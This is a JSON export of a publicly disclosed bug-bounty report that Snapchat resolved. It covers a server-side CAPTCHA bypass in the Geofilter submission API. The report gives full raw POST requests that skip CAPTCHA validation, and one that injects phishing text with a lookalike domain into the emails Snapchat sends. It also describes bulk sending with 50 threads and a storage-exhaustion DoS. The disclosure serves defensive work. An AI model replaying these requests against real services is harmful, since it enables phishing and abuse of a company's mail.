{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2015-04-04T01:14:56.364Z", 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "100.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 54641, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Captcha Bypass in Snapchat's Geofilter Submission Process", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2015-05-04T01:14:56.676Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$100", 
    "attachments": [
        {
            "file_name": "email1.png", 
            "type": "image/png", 
            "id": 33630, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/033/630/40a2ba38d3905a7ed23da383e3d84d5531a437d1/email1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230107Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ec4a3f345f20b0baa56a0d549049f5dcd71cb5276c31ba849f263e7cadbb598"
        }, 
        {
            "file_name": "email2.png", 
            "type": "image/png", 
            "id": 33635, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/033/635/794038427c94234eecd4508c8a6dbad1462babd9/email2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230107Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=484419f45a990fbb4702b279d09b32d18560090755de286a5fffdabca30876c8"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-04-03T21:16:16.901Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-03T21:16:16.901Z", 
            "actor": {
                "username": "bugtriage-josh", 
                "url": "/bugtriage-josh", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "snapchat", 
            "message": "Thank you for your report. We're looking into this issue.", 
            "markdown_message": "<p>Thank you for your report. We&#39;re looking into this issue.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 371246, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-04-04T01:04:49.739Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-04T01:04:49.739Z", 
            "actor": {
                "username": "jadboutros", 
                "url": "/jadboutros", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "snapchat", 
            "message": "Hi @Zero,\n\nThank you for your report, we appreciate it. While the Geofilter submission tool is specifically out of scope for our rewards program, we decided to make an exception in this case in light of your thorough report. Note that we do have size limits for our images and we are not at this time particularly concerned with DoS as it will be (a) easily detected and (b) this is not currently a mission critical service.\n\nWe have addressed the CAPTCHA bypass issue, good find and thank you for that! We encourage you to report issues on components in scope for our program and of course we will change the program rules over time. Please reopen if you still see issues with the CAPTCHA and we will in parallel ensure we have adequate limits for free-form text.\n\nHave a great week-end,\nJad", 
            "markdown_message": "<p>Hi <a href=\"/zero\">@Zero</a>,</p>\n\n<p>Thank you for your report, we appreciate it. While the Geofilter submission tool is specifically out of scope for our rewards program, we decided to make an exception in this case in light of your thorough report. Note that we do have size limits for our images and we are not at this time particularly concerned with DoS as it will be (a) easily detected and (b) this is not currently a mission critical service.</p>\n\n<p>We have addressed the CAPTCHA bypass issue, good find and thank you for that! We encourage you to report issues on components in scope for our program and of course we will change the program rules over time. Please reopen if you still see issues with the CAPTCHA and we will in parallel ensure we have adequate limits for free-form text.</p>\n\n<p>Have a great week-end,<br>\nJad</p>\n", 
            "type": "Activities::Comment", 
            "id": 371383, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "zero", 
                "url": "/zero"
            }, 
            "created_at": "2015-04-04T01:04:57.804Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-04T01:04:57.804Z", 
            "actor": {
                "username": "jadboutros", 
                "url": "/jadboutros", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "snapchat", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 371384, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-04-04T01:05:04.397Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-04T01:05:04.397Z", 
            "actor": {
                "url": "/snapchat", 
                "profile": {
                    "name": "Snapchat"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/513/05cbda412fc3539d8297bd6865bd59af476be2ce_medium.png?1432078031"
                }
            }, 
            "team_handle": "snapchat", 
            "bounty_amount": "100.0", 
            "collaborator": {
                "username": "zero", 
                "url": "/zero"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 371385, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-04-04T01:12:58.443Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-04T01:12:58.443Z", 
            "actor": {
                "username": "zero", 
                "url": "/zero", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/915/5f74f5f43744b12970ad8cb69f15138d4e6a400f_medium.png?1396615652"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "snapchat", 
            "message": "I've just tested the issue again and can confirm that the vulnerability has been fixed.\n\nI'll make sure that future submissions are in-scope, but if I do come across anything concerning that may be out of scope, I'll still report it.\n\nThanks for the bounty and quick reply :)", 
            "markdown_message": "<p>I&#39;ve just tested the issue again and can confirm that the vulnerability has been fixed.</p>\n\n<p>I&#39;ll make sure that future submissions are in-scope, but if I do come across anything concerning that may be out of scope, I&#39;ll still report it.</p>\n\n<p>Thanks for the bounty and quick reply :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 371395, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-04-04T01:14:56.438Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-04T01:14:56.438Z", 
            "actor": {
                "username": "zero", 
                "url": "/zero", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/915/5f74f5f43744b12970ad8cb69f15138d4e6a400f_medium.png?1396615652"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "snapchat", 
            "first_to_agree": true, 
            "message": "Please feel free to publicly disclose at your own discretion.\n\nThanks,\nShubham", 
            "markdown_message": "<p>Please feel free to publicly disclose at your own discretion.</p>\n\n<p>Thanks,<br>\nShubham</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 371396, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-04T01:15:06.976Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-04T01:15:06.976Z", 
            "actor": {
                "url": "/snapchat", 
                "profile": {
                    "name": "Snapchat"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/513/05cbda412fc3539d8297bd6865bd59af476be2ce_medium.png?1432078031"
                }
            }, 
            "team_handle": "snapchat", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 400861, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "zero", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/zero", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/003/915/2e2d6f1bd6005553a638a072a3440d5fdec6afb5_small.png?1396615652"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 57, 
        "name": "Violation of Secure Design Principles"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -113435171.28039904, 
    "disclosed_at": "2015-05-04T01:15:06.517Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/54641", 
    "created_at": "2015-04-03T12:44:21.990Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<p><strong>Overview:</strong><br>\nSnapchat provides a form in which users can submit &quot;Geofilters&quot;. These are filters which get applied to users snaps when they are in specific geolocations. The form (<a title=\"https://www.snapchat.com/geofilters/submit.html\" href=\"/redirect?signature=30dc4a1cddf1780b1a738861347dc8faa5d2a125&amp;url=https%3A%2F%2Fwww.snapchat.com%2Fgeofilters%2Fsubmit.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.snapchat.com/geofilters/submit.html</span><i class=\"icon-external-link\"></i></a>) allows for the submission of these &quot;Geofilters&quot; as an anonymous user.</p>\n\n<p>The following information is submitted through this form:</p>\n\n<ul>\n<li>Image (filter in PNG format) (<strong>image_data</strong>)</li>\n<li>Name (<strong>user_name</strong>)</li>\n<li>Email (<strong>user_email</strong>)</li>\n<li>Description (<strong>description</strong>)</li>\n<li>Notes (<strong>notes</strong>)</li>\n</ul>\n\n<p><strong>Vulnerability description:</strong><br>\nThe HTTP header <code>g-recaptcha-response</code> is not validated on the server-side when submitting a Geofilter to the endpoint <code>/_ah/api/geofilter/v1/submission</code> located on <code>geofilter-dot-feelinsonice-hrd.appspot.com</code>. Any or no value can be provided for this header. </p>\n\n<p>Since no CAPTCHA verification is needed, an attacker can then conduct a bulk email sending campaign on behalf of the email address <code>no_reply.geofilters@snapchat.com</code>. In addition to this, the attacker can spoof the contents of the email by customising the <code>user_name</code>, <code>notes</code> or <code>description</code> parameters.</p>\n\n<p><strong>Technical description:</strong><br>\nAfter successfully passing the CAPTCHA and submitting the Geofilter, a POST HTTP request is sent to <code>geofilter-dot-feelinsonice-hrd.appspot.com</code> :</p>\n<pre class=\"highlight plaintext\"><code>POST /_ah/api/geofilter/v1/submission HTTP/1.1\nHost: geofilter-dot-feelinsonice-hrd.appspot.com\nConnection: keep-alive\nContent-Length: 496\nSnapchat-CSRF-Protection: not-a-secret\nOrigin: https://www.snapchat.com\ng-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36\nContent-Type: application/json; charset=UTF-8\nAccept: application/json, text/javascript, */*; q=0.01\nDNT: 1\nReferer: https://www.snapchat.com/geofilters/submit.html\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\n\n{&quot;image_data&quot;:&quot;abcdefg&quot;,&quot;image_type&quot;:&quot;PNG&quot;,&quot;user_name&quot;:&quot;Shubham&quot;,&quot;user_email&quot;:&quot;admin+1@shubh.am&quot;,&quot;notes&quot;:&quot;lol&quot;,&quot;description&quot;:&quot;lol &quot;,&quot;geofence_polygon&quot;:&quot;[{\\&quot;lat\\&quot;:34.08166844698418,\\&quot;long\\&quot;:-118.35296630859375},{\\&quot;lat\\&quot;:34.16465895459983,\\&quot;long\\&quot;:-118.38180541992188},{\\&quot;lat\\&quot;:34.10725639663118,\\&quot;long\\&quot;:-118.30490112304688},{\\&quot;lat\\&quot;:34.10498222546687,\\&quot;long\\&quot;:-118.38180541992188},{\\&quot;lat\\&quot;:34.165227101802884,\\&quot;long\\&quot;:-118.33992004394531}]&quot;,&quot;start_millis&quot;:null,&quot;end_millis&quot;:null,&quot;is_event&quot;:false}\n</code></pre>\n<p><strong>Note</strong>: In this request, the header <code>g-recaptcha-response</code> does not have a valid token value. Instead, for demonstration purposes I have changed it to <code>I_love_cats_and_kittens_and_all_fluffy_things</code> (I actually do love kittens, but that&#39;s not the point). </p>\n\n<p>The same request can be sent with the very same token above or with no token at all, and it will still succeed. This is where the primary vulnerability lies.</p>\n\n<p>By sending the above request, my email (<code>admin+1@shubh.am</code>) will receive an email along the lines of the following: <a title=\"https://i.imgur.com/EF588pW.png\" href=\"/redirect?signature=0531ba5581321c341acde6eaa6447b470840966a&amp;url=https%3A%2F%2Fi.imgur.com%2FEF588pW.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://i.imgur.com/EF588pW.png</span><i class=\"icon-external-link\"></i></a> (also attached as email1.png).</p>\n\n<p>We can spoof the contents of this email by modifying the &quot;user_name&quot; parameter sent in our request. Take the following POST request into consideration:</p>\n<pre class=\"highlight plaintext\"><code>POST /_ah/api/geofilter/v1/submission HTTP/1.1\nHost: geofilter-dot-feelinsonice-hrd.appspot.com\nConnection: keep-alive\nContent-Length: 496\nSnapchat-CSRF-Protection: not-a-secret\nOrigin: https://www.snapchat.com\ng-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36\nContent-Type: application/json; charset=UTF-8\nAccept: application/json, text/javascript, */*; q=0.01\nDNT: 1\nReferer: https://www.snapchat.com/geofilters/submit.html\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\n\n{&quot;image_data&quot;:&quot;abcdefg&quot;,&quot;image_type&quot;:&quot;PNG&quot;,&quot;user_name&quot;:&quot;Shubham, in order for Snapchat to accept your Geofilter, you must activate by logging into https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215. Thank you&quot;,&quot;user_email&quot;:&quot;admin+1@shubh.am&quot;,&quot;notes&quot;:&quot;lol&quot;,&quot;description&quot;:&quot;lol &quot;,&quot;geofence_polygon&quot;:&quot;[{\\&quot;lat\\&quot;:34.08166844698418,\\&quot;long\\&quot;:-118.35296630859375},{\\&quot;lat\\&quot;:34.16465895459983,\\&quot;long\\&quot;:-118.38180541992188},{\\&quot;lat\\&quot;:34.10725639663118,\\&quot;long\\&quot;:-118.30490112304688},{\\&quot;lat\\&quot;:34.10498222546687,\\&quot;long\\&quot;:-118.38180541992188},{\\&quot;lat\\&quot;:34.165227101802884,\\&quot;long\\&quot;:-118.33992004394531}]&quot;,&quot;start_millis&quot;:null,&quot;end_millis&quot;:null,&quot;is_event&quot;:false}\n</code></pre>\n<p>The email received by the victim (in this case my email) will look like this: <a title=\"http://i.imgur.com/Xkyw7gV.png\" href=\"/redirect?signature=cbd706f9ea8314fa4f905da0cb1308da17258951&amp;url=http%3A%2F%2Fi.imgur.com%2FXkyw7gV.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://i.imgur.com/Xkyw7gV.png</span><i class=\"icon-external-link\"></i></a> (also attached as email2.png).</p>\n\n<p><strong>Impact:</strong><br>\nThe link <code>https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215</code> is automatically converted into a link (for most web email clients). In addition to this, some email clients (such as Gmail) will hide the rest of the email as it is a duplicate of a previous email (redundant). This makes the malicious email look even more convincing.</p>\n\n<p>These factors combined, allow for a convincing email to be sent, on behalf of the official Snapchat Geofilter API email <code>no_reply.geofilters@snapchat.com</code>. The attacker could leverage this vulnerability to send out emails on behalf of Snapchat. Over 1000 POST requests were sent using 50 threads. No rate limiting or limits were experienced. All 1000 emails were sent.</p>\n\n<p>Additionally, since the images are physically stored somewhere and the emails are sent per request - this vulnerability could also act as a DoS issue for Snapchat. The <strong>image_data</strong> field in the JSON object sent, is not checked for whether or not it is a valid image. Regardless of the contents, the contents are saved somewhere on Snapchat&#39;s servers. Through testing, I found that there were no obvious restrictions to how big of an image could be uploaded via this API.</p>\n\n<p>Both email quota&#39;s and file storage quota&#39;s could be consumed through the abuse of this API endpoint.</p>\n\n<p><strong>Remediation suggestions:</strong><br>\nIn order to address this design flaw, the following steps can be taken:</p>\n\n<ol>\n<li>Ensure that the Captcha verification token is being validated on the server-side.</li>\n<li>Limit the number of requests which can be sent to this endpoint (time based or number of submissions).</li>\n<li>Set a limit on the size of the image which can be sent and/or saved to Snapchat&#39;s servers.</li>\n</ol>\n\n<p>Please do not hesitate to contact if any additional details are required regarding this bug.</p>\n\n<p>Thank you,<br>\nShubham</p>\n", 
    "vulnerability_information": "Hi,\r\n\r\n**Overview:**\r\nSnapchat provides a form in which users can submit \"Geofilters\". These are filters which get applied to users snaps when they are in specific geolocations. The form (https://www.snapchat.com/geofilters/submit.html) allows for the submission of these \"Geofilters\" as an anonymous user.\r\n\r\nThe following information is submitted through this form:\r\n- Image (filter in PNG format) (**image_data**)\r\n- Name (**user_name**)\r\n- Email (**user_email**)\r\n- Description (**description**)\r\n- Notes (**notes**)\r\n\r\n**Vulnerability description:**\r\nThe HTTP header `g-recaptcha-response` is not validated on the server-side when submitting a Geofilter to the endpoint `/_ah/api/geofilter/v1/submission` located on `geofilter-dot-feelinsonice-hrd.appspot.com`. Any or no value can be provided for this header. \r\n\r\nSince no CAPTCHA verification is needed, an attacker can then conduct a bulk email sending campaign on behalf of the email address `no_reply.geofilters@snapchat.com`. In addition to this, the attacker can spoof the contents of the email by customising the `user_name`, `notes` or `description` parameters.\r\n\r\n**Technical description:**\r\nAfter successfully passing the CAPTCHA and submitting the Geofilter, a POST HTTP request is sent to `geofilter-dot-feelinsonice-hrd.appspot.com` :\r\n\r\n```\r\nPOST /_ah/api/geofilter/v1/submission HTTP/1.1\r\nHost: geofilter-dot-feelinsonice-hrd.appspot.com\r\nConnection: keep-alive\r\nContent-Length: 496\r\nSnapchat-CSRF-Protection: not-a-secret\r\nOrigin: https://www.snapchat.com\r\ng-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36\r\nContent-Type: application/json; charset=UTF-8\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nReferer: https://www.snapchat.com/geofilters/submit.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n{\"image_data\":\"abcdefg\",\"image_type\":\"PNG\",\"user_name\":\"Shubham\",\"user_email\":\"admin+1@shubh.am\",\"notes\":\"lol\",\"description\":\"lol \",\"geofence_polygon\":\"[{\\\"lat\\\":34.08166844698418,\\\"long\\\":-118.35296630859375},{\\\"lat\\\":34.16465895459983,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.10725639663118,\\\"long\\\":-118.30490112304688},{\\\"lat\\\":34.10498222546687,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.165227101802884,\\\"long\\\":-118.33992004394531}]\",\"start_millis\":null,\"end_millis\":null,\"is_event\":false}\r\n```\r\n\r\n**Note**: In this request, the header `g-recaptcha-response` does not have a valid token value. Instead, for demonstration purposes I have changed it to `I_love_cats_and_kittens_and_all_fluffy_things` (I actually do love kittens, but that's not the point). \r\n\r\nThe same request can be sent with the very same token above or with no token at all, and it will still succeed. This is where the primary vulnerability lies.\r\n\r\nBy sending the above request, my email (`admin+1@shubh.am`) will receive an email along the lines of the following: https://i.imgur.com/EF588pW.png (also attached as email1.png).\r\n\r\nWe can spoof the contents of this email by modifying the \"user_name\" parameter sent in our request. Take the following POST request into consideration:\r\n\r\n```\r\nPOST /_ah/api/geofilter/v1/submission HTTP/1.1\r\nHost: geofilter-dot-feelinsonice-hrd.appspot.com\r\nConnection: keep-alive\r\nContent-Length: 496\r\nSnapchat-CSRF-Protection: not-a-secret\r\nOrigin: https://www.snapchat.com\r\ng-recaptcha-response: I_love_cats_and_kittens_and_all_fluffy_things\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36\r\nContent-Type: application/json; charset=UTF-8\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nReferer: https://www.snapchat.com/geofilters/submit.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n{\"image_data\":\"abcdefg\",\"image_type\":\"PNG\",\"user_name\":\"Shubham, in order for Snapchat to accept your Geofilter, you must activate by logging into https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215. Thank you\",\"user_email\":\"admin+1@shubh.am\",\"notes\":\"lol\",\"description\":\"lol \",\"geofence_polygon\":\"[{\\\"lat\\\":34.08166844698418,\\\"long\\\":-118.35296630859375},{\\\"lat\\\":34.16465895459983,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.10725639663118,\\\"long\\\":-118.30490112304688},{\\\"lat\\\":34.10498222546687,\\\"long\\\":-118.38180541992188},{\\\"lat\\\":34.165227101802884,\\\"long\\\":-118.33992004394531}]\",\"start_millis\":null,\"end_millis\":null,\"is_event\":false}\r\n```\r\n\r\nThe email received by the victim (in this case my email) will look like this: http://i.imgur.com/Xkyw7gV.png (also attached as email2.png).\r\n\r\n**Impact:**\r\nThe link `https://account.snapchaat.com/verify_geofilter?id=12bc3a76-8df5-457c-bb9a-50f876a76215` is automatically converted into a link (for most web email clients). In addition to this, some email clients (such as Gmail) will hide the rest of the email as it is a duplicate of a previous email (redundant). This makes the malicious email look even more convincing.\r\n\r\nThese factors combined, allow for a convincing email to be sent, on behalf of the official Snapchat Geofilter API email `no_reply.geofilters@snapchat.com`. The attacker could leverage this vulnerability to send out emails on behalf of Snapchat. Over 1000 POST requests were sent using 50 threads. No rate limiting or limits were experienced. All 1000 emails were sent.\r\n\r\nAdditionally, since the images are physically stored somewhere and the emails are sent per request - this vulnerability could also act as a DoS issue for Snapchat. The **image_data** field in the JSON object sent, is not checked for whether or not it is a valid image. Regardless of the contents, the contents are saved somewhere on Snapchat's servers. Through testing, I found that there were no obvious restrictions to how big of an image could be uploaded via this API.\r\n\r\nBoth email quota's and file storage quota's could be consumed through the abuse of this API endpoint.\r\n\r\n**Remediation suggestions:**\r\nIn order to address this design flaw, the following steps can be taken:\r\n1. Ensure that the Captcha verification token is being validated on the server-side.\r\n2. Limit the number of requests which can be sent to this endpoint (time based or number of submissions).\r\n3. Set a limit on the size of the image which can be sent and/or saved to Snapchat's servers.\r\n\r\nPlease do not hesitate to contact if any additional details are required regarding this bug.\r\n\r\nThank you,\r\nShubham", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.snapchat.com/", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Snapchat"
        }, 
        "handle": "snapchat", 
        "url": "https://hackerone.com/snapchat", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/513/787aa235c91a9f2ac341e1c826c7dbbeeb118393_small.png?1432078031", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/513/05cbda412fc3539d8297bd6865bd59af476be2ce_medium.png?1432078031"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 513, 
        "default_currency": "usd"
    }, 
    "is_published": false
}